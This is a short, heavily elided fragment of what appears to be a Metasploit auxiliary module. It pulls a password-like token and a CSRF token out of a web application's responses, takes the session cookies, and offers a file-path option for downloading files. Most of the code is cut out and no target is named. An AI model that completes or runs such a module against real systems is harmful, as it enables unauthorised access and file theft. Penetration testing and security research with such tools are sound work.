...
class MetasploitModule < Msf::Auxiliary
  ...
  def initialize(info = {})
    ...
    register_options(
      [
        ...
        OptString.new('FILEPATH', [ false, 'Path of the file to download',
  ...
  def run
    ...
    if res and res.code == 200 and res.body[/\"data\":\"([0-9a-f\-]{36})/]
      password = $1
    ...
    if res and res.code == 302 and res.get_cookies
      ...
      if res and res.code == 200 and res.body =~ /var csrfToken \= \"([0-9a-f\-]{36})\";/
